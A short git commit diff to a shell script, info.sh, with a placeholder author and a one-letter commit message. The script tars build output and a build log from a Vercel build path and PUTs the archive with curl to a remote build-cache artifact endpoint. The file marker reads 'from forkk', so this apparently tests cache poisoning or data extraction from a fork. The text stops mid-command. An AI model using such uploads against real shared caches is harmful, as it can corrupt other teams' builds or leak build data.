e0ae3a0d5b5c9589c00ab2dcf63592e74814bef4
Mona Lisa <bla@bla.com>
2026-07-02 16:18:53 +0200

    b

--- info.sh
+++ info.sh
@@ -13,8 +13,8 @@ echo "----PUT----"
 mkdir -p public
 touch public/index.html
 echo "from forkk">publicindex.html
-# tar -cf a.tar -C /vercel/path0 app/web/dist app/web/.turbo/turbo-build.log && zstd a.tar
-tar -cf artifact.tar -C /vercel/path0 public/ && zstd artifact.tar
+tar -cf artifact.tar -C /vercel/path0 app/web/dist app/web/.turbo/turbo-build.log && zstd artifact.tar
+# tar -cf artifact.tar -C /vercel/path0 public/ && zstd artifact.tar
 
 curl -sS -X PUT \
   "$API/v8/artifacts/$HASH?teamId=$TEAM" \
